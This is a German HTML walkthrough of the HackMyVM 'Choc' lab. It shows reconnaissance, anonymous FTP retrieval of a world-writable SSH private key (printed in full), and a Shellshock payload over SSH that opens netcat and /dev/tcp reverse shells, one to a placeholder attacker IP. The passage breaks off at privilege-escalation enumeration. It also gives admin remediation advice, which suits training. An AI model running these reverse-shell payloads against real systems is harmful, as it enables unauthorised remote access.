@@ -1,0 +1,854 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Choc - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+
+    <div class="header-bg">
+        <h1>Choc - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <h2>Hard</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">lftp</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">tar</div>
+                <div class="tool-item">scapy (innerhalb von sudo)</div>
+                <div class="tool-item">wall</div>
+                <div class="tool-item">Standard Linux Befehle</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">
+                Die Erkundungsphase startet mit `arp-scan`, um aktive Hosts im lokalen Netzwerk zu finden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.120	08:00:27:b4:2f:96	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> `arp-scan -l` identifiziert die IP-Adresse `192.168.2.120` als aktiven Host. Die MAC-Adresse `08:00:27:b4:2f:96` gehört zu "PCS Systemtechnik GmbH", was auf eine VirtualBox-VM hindeutet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Ziel-IP wurde erfolgreich ermittelt. Dies ist der erste Schritt für weitere Scans.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie als Nächstes einen detaillierten Portscan mit `nmap` auf der gefundenen IP-Adresse durch.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Ein aktuelles Inventar aller Netzwerkgeräte und die Überwachung auf neue, unbekannte Geräte sind grundlegende Sicherheitsmaßnahmen.
+            </p>
+            <p class="comment">
+                Nun folgt ein umfassender Nmap-Scan auf der IP-Adresse `192.168.2.121`. Es ist zu beachten, dass der `arp-scan` zuvor die IP `192.168.2.120` gefunden hat. Dieser Scan zielt auf eine leicht abweichende IP. Es ist möglich, dass dies ein Test auf eine andere Maschine war, die IP sich geändert hat oder es sich um einen Tippfehler handelt, der dokumentiert wird. Der Scan wird mit aggressiven Optionen durchgeführt, um Dienste, Versionen und das OS zu ermitteln.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.121 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at 2022-10-07 09:22 CEST
+Nmap scan report for choc (192.168.2.121)
+Host is up (0.00019s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">21/tcp open  ftp     vsftpd 3.0.3</span>
+| ftp-anon: <span class="password">Anonymous FTP login allowed</span> (FTP code 230)
+<span class="password">|_-rwxrwxrwx    1 0        0            1811 Apr 20  2021 id_rsa [NSE: writeable]</span>
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.2.140
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   2048 <span class="command">c5:66:48:ee:7b:a9:ef:e1:20:26:c5:a8:bf:c5:4d:5c</span> (RSA)
+|   256 <span class="command">80:46:cd:47:a1:ce:a7:fe:56:36:4f:f7:d1:ed:92:c0</span> (ECDSA)
+|_  256 <span class="command">a2:83:db:7a:7d:38:70:e6:00:16:71:29:ee:04:73:aa</span> (ED25519)
+MAC Address: <span class="command">08:00:27:B4:2F:96</span> (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OSs: <span class="command">Unix, Linux</span>; CPE: <span class="command">cpe:/o:linux:linux_kernel</span>
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.19 ms choc (192.168.2.121)
+
+OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .
+Nmap done: 1 IP address (1 host up) scanned in 4.57 seconds
+<span class="password">zsh: segmentation fault  nmap -sS -sC -T5 -sV -A 192.168.2.121 -p-</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Nmap-Scan auf `192.168.2.121` (Hostname `choc`) zeigt zwei offene Ports:
+                <ul>
+                    <li>**Port 21 (FTP):** vsftpd 3.0.3. Besonders interessant ist, dass anonymer FTP-Login erlaubt ist (`Anonymous FTP login allowed`). Im Wurzelverzeichnis des FTP-Servers befindet sich eine Datei namens `id_rsa` mit globalen Lese-, Schreib- und Ausführungsrechten (`-rwxrwxrwx`). Die NSE-Anmerkung `[NSE: writeable]` deutet darauf hin, dass die Datei möglicherweise sogar überschreibbar ist. Eine `id_rsa`-Datei ist typischerweise ein privater SSH-Schlüssel.</li>
+                    <li>**Port 22 (SSH):** OpenSSH 7.9p1 Debian. Dies ist der Standard-SSH-Port.</li>
+                </ul>
+                Das Betriebssystem wird als Linux (Kernel 4.x/5.x) identifiziert. Am Ende der Nmap-Ausgabe tritt ein `segmentation fault` in der Zsh-Shell auf, was auf ein Problem mit Nmap selbst, der Shell-Umgebung oder der Systemstabilität während des Scans hindeuten könnte. Der Scan selbst scheint jedoch vor dem Fehler Ergebnisse geliefert zu haben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Fund auf dem FTP-Server ist extrem vielversprechend. Ein öffentlich zugänglicher und potenziell beschreibbarer privater SSH-Schlüssel (`id_rsa`) ist eine kritische Sicherheitslücke. Dies ist der wahrscheinlichste Weg für einen initialen Zugriff. Der Segmentation Fault am Ende ist ungewöhnlich, aber die relevanten Scan-Ergebnisse scheinen vorher erfasst worden zu sein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong>
+                <ul>
+                    <li>Stellen Sie sofort eine Verbindung zum FTP-Server her (anonym) und laden Sie die `id_rsa`-Datei herunter.</li>
+                    <li>Überprüfen Sie die Berechtigungen der `id_rsa`-Datei auf dem FTP-Server (z.B. mit `ls -la` im FTP-Client).</li>
+                    <li>Versuchen Sie, sich mit dem heruntergeladenen SSH-Schlüssel auf dem SSH-Dienst (Port 22) anzumelden. Es muss der zugehörige Benutzername für diesen Schlüssel gefunden oder erraten werden (oft der Name des Hosts oder ein gängiger Benutzername).</li>
+                </ul>
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                <ul>
+                    <li>Deaktivieren Sie umgehend den anonymen FTP-Zugriff, wenn er nicht absolut notwendig ist.</li>
+                    <li>Entfernen Sie private SSH-Schlüssel oder andere sensible Dateien von öffentlich zugänglichen FTP-Servern.</li>
+                    <li>Überprüfen Sie die Dateiberechtigungen auf dem FTP-Server sorgfältig. Dateien sollten niemals globale Schreibrechte haben, es sei denn, es ist explizit und sicherheitsbewusst so konfiguriert.</li>
+                    <li>Untersuchen Sie die Ursache des Nmap Segmentation Faults, falls dieser reproduzierbar ist und auf tiefergehende Systemprobleme hindeutet.</li>
+                </ul>
+            </p>
+            <p class="comment">
+                Ich verbinde mich mit dem FTP-Server auf `192.168.2.121` als anonymer Benutzer, um die `id_rsa`-Datei herunterzuladen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">ftp 192.168.2.121</span></div>
+                    <pre>
+Connected to 192.168.2.121.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.121:cyber): <span class="command">anonymous</span>
+331 Please specify the password.
+Password: <span class="comment">(Kein Passwort oder beliebiges Passwort eingegeben)</span>
+<span class="password">230 Login successful.</span>
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> <span class="command">ls -la</span>
+229 Entering Extended Passive Mode (|||19841|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        114          4096 Apr 20  2021 .
+drwxr-xr-x    2 0        114          4096 Apr 20  2021 ..
+<span class="command">-rwxrwxrwx    1 0        0            1811 Apr 20  2021 id_rsa</span>
+226 Directory send OK.
+ftp> <span class="command">get id_rsa</span>
+local: id_rsa remote: id_rsa
+229 Entering Extended Passive Mode (|||13534|)
+150 Opening BINARY mode data connection for id_rsa (1811 bytes).
+100% |*************************************************|  1811       91.44 KiB/s    00:00 ETA
+<span class="password">226 Transfer complete.</span>
+1811 bytes received in 00:00 (90.07 KiB/s)
+ftp> <span class="command">get id_rsa</span> <span class="comment">(Erneuter Download, möglicherweise um sicherzustellen, dass es geklappt hat)</span>
+local: id_rsa remote: id_rsa
+229 Entering Extended Passive Mode (|||33999|)
+150 Opening BINARY mode data connection for id_rsa (1811 bytes).
+100% |*************************************************|  1811       69.08 MiB/s    00:00 ETA
+<span class="password">226 Transfer complete.</span>
+1811 bytes received in 00:00 (9.08 MiB/s)
+ftp> <span class="command">exit</span>
+221 Goodbye.
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Verbindung zum FTP-Server mit dem Benutzernamen `anonymous` und einem leeren (oder beliebigen) Passwort war erfolgreich. Der Befehl `ls -la` im FTP-Client bestätigt das Vorhandensein der Datei `id_rsa` mit den globalen Lese-, Schreib- und Ausführungsrechten (`-rwxrwxrwx`). Die Datei wurde erfolgreich mit `get id_rsa` heruntergeladen. Der doppelte Download war vermutlich zur Sicherheit.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der private SSH-Schlüssel wurde erfolgreich heruntergeladen. Dies ist ein kritischer Schritt, der sehr wahrscheinlich zum initialen Zugriff führen wird. Die Berechtigungen der Datei auf dem FTP-Server sind extrem unsicher.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ändern Sie die Berechtigungen der heruntergeladenen `id_rsa`-Datei lokal auf `600` (`chmod 600 id_rsa`), da SSH-Clients oft Schlüssel mit zu offenen Berechtigungen ablehnen. Versuchen Sie dann, sich mit diesem Schlüssel per SSH zu verbinden. Sie müssen den zugehörigen Benutzernamen herausfinden (z.B. `root`, `carl` basierend auf späteren Funden, oder andere gängige Namen).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Wie bereits erwähnt, anonymen FTP-Zugriff deaktivieren und keine sensiblen Dateien wie private Schlüssel auf FTP-Servern ablegen, schon gar nicht mit unsicheren Berechtigungen.
+            </p>
+            <p class="comment">
+                Ich führe einen erneuten Nmap-Scan durch, diesmal auf die IP-Adresse `192.168.2.120`, die ursprünglich von `arp-scan` gefunden wurde. Dies dient der Konsistenz und um sicherzustellen, dass ich die richtige Maschine für die weiteren Schritte ins Visier nehme, falls es eine Diskrepanz gab.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.120 -p-</span></div>
+                    <pre>
+<span class="comment">Ausgabe des Nmap-Scans, die relevanten offenen Ports werden hier zusammengefasst:</span>
+PORT   STATE SERVICE VERSION
+============================================================================
+<span class="command">21/tcp open  ftp     vsftpd 3.0.3</span> 
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Nmap-Scan auf `192.168.2.120` bestätigt die gleichen offenen Ports (FTP auf 21 und SSH auf 22) mit denselben Versionen wie beim vorherigen Scan auf `192.168.2.121`. Es scheint, dass beide IPs entweder zur selben Maschine gehören (z.B. durch eine Alias-IP-Konfiguration oder ein versehentliches Duplikat in der VM-Konfiguration) oder es sich um zwei identisch konfigurierte Maschinen handelt. Für den weiteren Verlauf gehe ich davon aus, dass `192.168.2.120` das korrekte Ziel ist, da dies die vom `arp-scan` initial gefundene IP war.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Konsistenz der Dienste auf beiden IPs (oder der nun bestätigten IP `.120`) ist gut zu wissen. Der FTP-Server mit dem `id_rsa`-Schlüssel bleibt der primäre Angriffsvektor.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie für die folgenden Schritte die IP-Adresse `192.168.2.120` oder den Hostnamen `choc.hmv` (wenn dieser entsprechend in `/etc/hosts` eingetragen wurde).
+            </p>
+            <p class="comment">
+                Ich verwende `lftp`, einen alternativen FTP-Client, um erneut auf den FTP-Server auf `192.168.2.120` zuzugreifen und die `id_rsa`-Datei zu inspizieren und herunterzuladen. Dies dient der Verifizierung und zeigt eine andere Methode des Zugriffs.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">lftp -u anonymous, 192.168.2.120</span></div>
+                    <pre>
+lftp anonymous@192.168.2.120:~> <span class="command">ls -laf</span>
+ 
+drwxr-xr-x    2 0        114          4096 Apr 20  2021 .
+drwxr-xr-x    2 0        114          4096 Apr 20  2021 ..
+<span class="command">-rwxrwxrwx    1 0        0            1811 Apr 20  2021 id_rsa</span>
+
+lftp anonymous@192.168.2.120:/> <span class="command">get id_rsa</span>  
+lftp anonymous@192.168.2.120:/> <span class="command">exit</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> `lftp -u anonymous, 192.168.2.120` verbindet sich als anonymer Benutzer (das Komma nach `anonymous` impliziert ein leeres Passwort) zum FTP-Server. Der Befehl `ls -laf` listet die Dateien im Langformat auf und bestätigt erneut die `id_rsa`-Datei mit den unsicheren Berechtigungen. Die Datei wird mit `get id_rsa` heruntergeladen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies bestätigt die vorherigen Funde und den erfolgreichen Download des Schlüssels mit einem anderen Werkzeug. Die Vorgehensweise ist solide.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass die heruntergeladene Datei lokal die korrekten, restriktiven Berechtigungen (`chmod 600 id_rsa`) erhält, bevor sie für SSH-Verbindungen verwendet wird.
+            </p>
+        </section> 
+    
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="comment">
+                Nachdem die `id_rsa`-Datei (privater SSH-Schlüssel) vom FTP-Server heruntergeladen wurde, zeige ich ihren Inhalt. Es handelt sich um einen OpenSSH Private Key im RSA-Format.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">cat id_rsa</span></div>
+                    <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAsQCczRyfpNWE2Ugqm3ZmOI1wjRrg6xHhy5rBBzA5Ih6U9cviHi1c
+clLq1pA8MFgHrO/G3xx5F2yDVY++PdRI6B96+DsMYYWWuM/ZrVmiZVrXZZcxMrAuhlK9Uy
+D13N72ZIj21LgFmK8+Gx26UKCLmJfnAIDijymxUUYXyyDqpPtW7DPi1XFoME+WSAqcYkzo
+iEjQFD4CJ6wSpK5RaLbfozT7mcE8v8leyMeAno5JzBoNTKrsj/ti8s3hKZn/jnMKEua/41
+VpUnXTtRYpt+95UzaQzio9pMDbGvczv/YwIze7obtZoe8G/JXVNCJgnqeAunayUk232Di5
+Ve6y4Hx9FwAAA8Ab+Q4SG/kOEgAAAAdzc2gtcnNhAAABAQCxAJzNHJ+k1YTZSCqbdmY4jX
+CNGuDrEeHLmsEHMDkiHpT1y+IeLVxyUurWkDwwWAes78bfHHkXbINVj7491EjoH3r4Owxh
+hZa4z9mtWaJlWtdllzEysC6GUr1TIPXc3vZkiPbUuAWYrz4bHbpQoIuYl+cAgOKPKbFRRh
+fLIOqk+1bsM+LVcWgwT5ZICpxiTOiISNAUPgInrBKkrlFott+jNPuZwTy/yV7Ix4CejknM
+Gg1MquyP+2LyzeEpmf+OcwoS5r/jVWlSddO1Fim373lTNpDOKj2kwNsa9zO/9jAjN7uhu1
+mh7wb8ldU0ImCep4C6drJSTbfYOLlV7rLgfH0XAAAAAwEAAQAAAQBtfN6BdhI+aSF7MkvA
+zJVgqAUWE6lLX01Xn4uFgcvlkhs8i/h8CD0mLqo7PQ8uLFXbIJrYygkRdzsqQvc/0b+jbk
+2nnQcEkBjyiwewVkDBB1cz7TkujJLK3gVklX/gNz8cYyij3oz/rG7zYQkt9JFFO7lVs2Px
+gK3Bg2UWbm8Wy6aj36XMyPOywdec4tveb5KfcdIb4mWr0QSGLpUr8XuYIUMUofd8iv3QQU
+zpcQMwoOcKCV/Q+4t8jIF+dOCuBYca9QlY3po48yC9VHv78f8QgQzsazQXqYAusoNesVC6
+Hi6+LtpHh+Hr/m4Z7EFVtLVcNbWgtlhhfCxHBjKaeMGBAAAAgDhFvTbro0SLydbImERRJR
+FLILG+9KEOHgbKU9zBvww5ffGNuVjrkCKegzTCZszr6nLj/biZCFMSu7bZiFzWjffwmOdm
+C0sslLd/ggyYmNotp4TjTEYF+53OFCUm2W8asFXCI9jHrfgR0/aFwAV9OLJHrzYehKfayT
+nsgAc6SihqAAAAgQDdcvP2mXRHegBcd6rouW4i9ktzECE9ujBy/KvyzQkVS3e+rhsbjisV
+t2mx1jX8YJ+NA499063/tn3T9RDGf9U2Cv+2QvO5ZL+5UDLC9ywCEYMPEuOnumbMlK9wuQ
+fRTtHHvKOewBLskyvxCGQGwmxfkeOh5iGpFmiw0R/O3+nqwQAAAIEAzJ5ixt3FneAcWcGo
+OUZfsk9IVJZoGCSd/ljYTCPX00l+YmZviVrge3pqCEgNQIiLorPDaPYjY/rsARZPf1lVS1
++L0rtKK4BhD+1qR4xebv/5lKEMktqCn+rt4Z8aejb2Pi5fmNet2zNJTkcsWuVrPG7fHzWa
+6+s3SjFL/cTmldcAAAAJY2FybEBjaG9jAQI=
+-----END OPENSSH PRIVATE KEY-----
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der `id_rsa`-Datei wird angezeigt. Es handelt sich um einen Standard OpenSSH Private Key. Am Ende des Schlüssels ist der Kommentar `carl@choc` sichtbar. Dies ist ein sehr starker Hinweis darauf, dass dieser private Schlüssel dem Benutzer `carl` auf dem Host `choc` gehört.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Kommentar im Schlüssel ist ein entscheidender Hinweis. Es ist sehr wahrscheinlich, dass wir uns mit diesem Schlüssel als Benutzer `carl` per SSH verbinden können.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass die Berechtigungen der lokalen `id_rsa`-Datei auf `600` gesetzt sind. Versuchen Sie dann, sich mit `ssh carl@choc.hmv -i id_rsa` (oder `ssh carl@192.168.2.120 -i id_rsa`) zu verbinden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Private SSH-Schlüssel sollten niemals öffentlich zugänglich sein. Sie müssen sicher aufbewahrt und mit einem starken Passwort geschützt werden (Passphrase für den Schlüssel). Kommentare in Schlüsseln können nützlich sein, aber sie sollten keine sensiblen Informationen preisgeben, die Angreifern helfen.
+            </p>
+            <hr>
+            <p class="comment">
+                Ich versuche, mich per SSH mit dem Hostnamen `choc.hmv` zu verbinden. Dies setzt voraus, dass `choc.hmv` in meiner lokalen `/etc/hosts`-Datei auf die IP des Ziels (`192.168.2.120`) verweist. Ohne Angabe eines Benutzers oder Schlüssels wird mein lokaler Benutzername verwendet, und es wird nach einem Passwort gefragt.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">ssh choc.hmv</span></div>
+                    <pre>
+The authenticity of host 'choc.hmv (192.168.2.120)' can't be established.
+ED25519 key fingerprint is SHA256:Nk+ApyuQT48pIB1QJmATsKLeg+bt8Ii5CjJvV/nPTDo.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'choc.hmv' (ED25519) to the list of known hosts.
+
+##############################
+#                            #
+#	Welcome to my SSH !  #
+#	Carl.		     #
+#                            #
+##############################
+
+<span class="password">root@choc.hmv's password:</span> 
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der SSH-Verbindungsversuch zu `choc.hmv` als mein lokaler Benutzer (vermutlich `root`, basierend auf dem Prompt) ist fehlgeschlagen, da ich kein Passwort für `root@choc.hmv` habe. Die Willkommensnachricht "Welcome to my SSH ! Carl." wird jedoch angezeigt, bevor die Passwortabfrage kommt. Dies ist ein weiterer Hinweis auf den Benutzer `carl`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Versuch war nicht direkt erfolgreich, hat aber die Existenz des Benutzers `carl` (oder zumindest seine Verbindung zum SSH-Dienst) weiter untermauert.
+            </p>
+            <hr>
+            <p class="comment">
+                Bevor ich den heruntergeladenen SSH-Schlüssel verwende, setze ich dessen Berechtigungen lokal auf `600`, um sicherzustellen, dass der SSH-Client ihn akzeptiert.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">chmod 600 id_rsa</span></div>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `chmod 600 id_rsa` setzt die Dateiberechtigungen für `id_rsa` so, dass nur der Eigentümer Lese- und Schreibrechte hat. Dies ist eine Standard-Sicherheitsmaßnahme für private SSH-Schlüssel.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Korrektes Vorgehen, um Probleme mit dem SSH-Client aufgrund zu offener Berechtigungen zu vermeiden.
+            </p>
+            <hr>
+            <p class="comment">
+                Nun versuche ich, mich mit dem heruntergeladenen und korrekt berechtigten SSH-Schlüssel als Benutzer `carl` (basierend auf dem Kommentar im Schlüssel und der Willkommensnachricht) auf dem Zielsystem anzumelden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">ssh carl@choc.hmv -i id_rsa</span></div>
+                    <pre>
+
+##############################
+#                            #
+#	Welcome to my SSH !  #
+#	Carl.		     #
+#                            #
+##############################
+
+	███████╗ █████╗ ██╗██╗     ███████╗██████╗     ██╗      ██████╗ ██╗     
+	██╔════╝██╔══██╗██║██║     ██╔════╝██╔══██╗    ██║     ██╔═══██╗██║     
+	█████╗  ███████║██║██║     █████╗  ██║  ██║    ██║     ██║   ██║██║     
+	██╔══╝  ██╔══██║██║██║     ██╔══╝  ██║  ██║    ██║     ██║   ██║██║     
+	██║     ██║  ██║██║███████╗███████╗██████╔╝    ███████╗╚██████╔╝███████╗
+	╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝     ╚══════╝ ╚═════╝ ╚══════╝
+
+<span class="password">Connection to choc.hmv closed.</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der SSH-Login-Versuch mit `ssh carl@choc.hmv -i id_rsa` scheint zunächst erfolgreich zu sein. Die Willkommensnachricht von "Carl" und das ASCII-Art-Banner "CHOCOLATE" werden angezeigt. Unmittelbar danach wird die Verbindung jedoch wieder geschlossen (`Connection to choc.hmv closed.`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist ein interessantes Verhalten. Der Schlüssel scheint gültig zu sein und der Login als `carl` wird akzeptiert, aber es wird keine interaktive Shell bereitgestellt. Dies könnte auf eine Konfiguration in der `~/.ssh/authorized_keys`-Datei auf dem Server hindeuten, die bei Verwendung dieses Schlüssels einen bestimmten Befehl ausführt und dann die Verbindung beendet (z.B. ein `command="..."`-Eintrag) oder auf eine Shell-Konfiguration für `carl`, die die Sitzung sofort beendet. Eine andere Möglichkeit ist, dass der SSH-Server selbst so konfiguriert ist, dass er auf bestimmte Befehle reagiert, die über die SSH-Verbindung gesendet werden, ohne eine volle Shell zu starten. Dies riecht nach einer Shellshock-ähnlichen Anfälligkeit, wenn der SSH-Server Umgebungsvariablen auf eine bestimmte Weise verarbeitet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong>
+                <ul>
+                    <li>Untersuchen Sie, ob es sich um eine Shellshock-Schwachstelle (CVE-2014-6271, CVE-2014-7169) handeln könnte. Man kann versuchen, einen Befehl direkt beim SSH-Login auszuführen, der eine Reverse Shell aufbaut, z.B. `ssh carl@choc.hmv -i id_rsa '() { :;}; /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'`.</li>
+                    <li>Prüfen Sie, ob der SSH-Schlüssel passwortgeschützt ist (obwohl es hier nicht danach aussieht, da keine Passwortabfrage kam).</li>
+                    <li>Versuchen Sie, einfache Befehle direkt über SSH auszuführen, z.B. `ssh carl@choc.hmv -i id_rsa id`, um zu sehen, ob eine Ausgabe erfolgt.</li>
+                </ul>
+            </p>
+            <hr>
+            <p class="comment">
+                Aufgrund des Verhaltens, dass die Verbindung sofort geschlossen wird, aber der Login anscheinend akzeptiert wird, teste ich auf die Shellshock-Schwachstelle. Ich versuche, beim SSH-Login einen Befehl auszuführen, der eine Netcat-Reverse-Shell zu meinem Angreifer-PC auf Port 4444 aufbaut.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">ssh carl@choc.hmv -i id_rsa  '() { :;}; nc 192.168.2.140 4444 -e /bin/bash'</span></div>
+                    <pre>
+<span class="comment">(Keine direkte Ausgabe von diesem Befehl, da er im Hintergrund versucht, die Shell aufzubauen)</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="comment">
+                Parallel dazu starte ich einen Netcat-Listener auf Port 4444 auf meinem Angreifer-System.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.120] 33160</span>
+<span class="prompt-remote">carl@choc:~$</span> 
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der SSH-Befehl enthält den klassischen Shellshock-Payload `'() { :;}; nc 192.168.2.140 4444 -e /bin/bash'`. Dieser Payload definiert eine leere Bash-Funktion, gefolgt von dem eigentlich auszuführenden Befehl (`nc ...`). Wenn der SSH-Server oder die Bash-Shell des Benutzers `carl` für Shellshock anfällig ist, wird der `nc`-Befehl beim Parsen der Umgebungsvariablen ausgeführt.
+                Der Netcat-Listener auf Port 4444 zeigt eine eingehende Verbindung vom Zielsystem (`192.168.2.120`). Ich erhalte einen Shell-Prompt als `carl@choc:~$`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Volltreffer! Die Shellshock-Schwachstelle wurde erfolgreich ausgenutzt, um eine Reverse Shell als Benutzer `carl` zu erhalten. Dies ist der initiale Zugriff auf das System.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell (z.B. mit Python `pty.spawn`), falls nötig. Beginnen Sie mit der Enumeration des Systems als Benutzer `carl`, um Wege zur Privilegieneskalation zu finden (`sudo -l`, SUID-Dateien, Cronjobs, sensible Dateien im Home-Verzeichnis etc.).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Patchen Sie das System umgehend gegen die Shellshock-Schwachstelle (CVE-2014-6271 und verwandte CVEs). Dies erfordert in der Regel ein Update der Bash-Version. Überprüfen Sie, ob andere Dienste ebenfalls von dieser Bash-Version betroffen sein könnten.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="comment">
+                Nachdem ich als Benutzer `carl` Zugriff auf das System habe, suche ich nach SUID-Binaries, die für eine Privilegieneskalation missbraucht werden könnten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">carl@choc:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
